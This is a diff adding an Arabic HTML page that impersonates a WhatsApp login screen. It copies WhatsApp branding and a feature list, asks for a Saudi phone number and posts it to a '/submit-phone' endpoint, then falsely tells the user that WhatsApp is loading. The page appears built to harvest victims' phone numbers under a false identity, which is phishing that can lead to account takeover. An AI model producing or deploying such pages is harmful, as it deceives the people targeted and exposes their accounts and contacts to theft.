@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى WhatsApp</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #075E54, #128C7E);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+        
+        .whatsapp-logo {
+            width: 80px;
+            height: 80px;
+            background: #25D366;
+            border-radius: 50%;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+        }
+        
+        .header {
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #075E54;
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .login-form {
+            text-align: right;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #075E54;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .phone-input {
+            position: relative;
+        }
+        
+        .phone-input input {
+            width: 100%;
+            padding: 16px 50px 16px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+            text-align: right;
+            direction: ltr;
+        }
+        
+        .phone-input input:focus {
+            outline: none;
+            border-color: #25D366;
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.1);
+        }
+        
+        .country-code {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 16px;
+            background: #25D366;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn-login:hover {
+            background: #128C7E;
+        }
+        
+        .btn-login:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            display: none;
+            font-weight: 500;
+        }
+        
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .whatsapp-features {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            text-align: right;
+        }
+        
+        .whatsapp-features h3 {
+            color: #075E54;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .whatsapp-features ul {
+            list-style: none;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .whatsapp-features li {
+            margin-bottom: 8px;
+            padding-right: 20px;
+            position: relative;
+        }
+        
+        .whatsapp-features li:before {
+            content: "✓";
+            position: absolute;
+            right: 0;
+            color: #25D366;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="whatsapp-logo">📱</div>
+        
+        <div class="header">
+            <h1>تسجيل الدخول إلى WhatsApp</h1>
+            <p>أدخل رقم هاتفك للبدء في استخدام التطبيق</p>
+        </div>
+        
+        <form class="login-form" id="loginForm">
+            <div class="form-group">
+                <label for="phone">رقم الهاتف</label>
+                <div class="phone-input">
+                    <input 
+                        type="tel" 
+                        id="phone" 
+                        placeholder="5XXXXXXXX" 
+                        required
+                        pattern="[0-9]{8,15}"
+                        maxlength="15"
+                    >
+                    <span class="country-code">966+</span>
+                </div>
+            </div>
+            
+            <button type="submit" class="btn-login" id="submitBtn">
+                تسجيل الدخول
+            </button>
+        </form>
+        
+        <div id="message" class="message"></div>
+        
+        <div class="whatsapp-features">
+            <h3>مزايا WhatsApp</h3>
+            <ul>
+                <li>رسائل فورية ومجانية</li>
+                <li>مكالمات صوتية وفيديو</li>
+                <li>تشفير end-to-end</li>
+                <li>مشاركة الملفات والوسائط</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const fullPhone = '966' + phone; // إضافة رمز السعودية
+            const messageDiv = document.getElementById('message');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // التحقق من صحة الرقم
+            if (!phone.match(/^[0-9]{8,9}$/)) {
+                showMessage('❌ يرجى إدخال رقم هاتف صحيح (8-9 أرقام)', 'error');
+                return;
+            }
+            
+            // تعطيل الزر وإظهار التحميل
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'جاري التسجيل...';
+            showMessage('⏳ جاري تسجيل الدخول...', 'success');
+            
+            try {
+                // إرسال الرقم إلى الخادم
+                const response = await fetch('/submit-phone', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        phone: fullPhone,
+                        userId: 'website_user'
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    showMessage('✅ ' + result.message, 'success');
+                    
+                    // محاكاة تحميل واتساب
+                    setTimeout(() => {
+                        showMessage('📱 جاري تحميل واتساب...', 'success');
+                    }, 1000);
+                    
+                    // مسح الحقل
+                    document.getElementById('phone').value = '';
+                    
+                } else {
+                    showMessage('❌ ' + result.message, 'error');
+                }
+                
+            } catch (error) {
+                showMessage('❌ حدث خطأ في الإرسال', 'error');
+                console.error('Error:', error);
+            } finally {
+                // إعادة تمكين الزر
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'تسجيل الدخول';
+            }
+        });
+        
+        function showMessage(text, type) {
+            const messageDiv = document.getElementById('message');
+            messageDiv.textContent = text;
+            messageDiv.className = `message ${type}`;
+            messageDiv.style.display = 'block';
+        }
+        
+        // تركيز على حقل الرقم تلقائياً
+        document.getElementById('phone').focus();
+    </script>
+</body>
+</html>
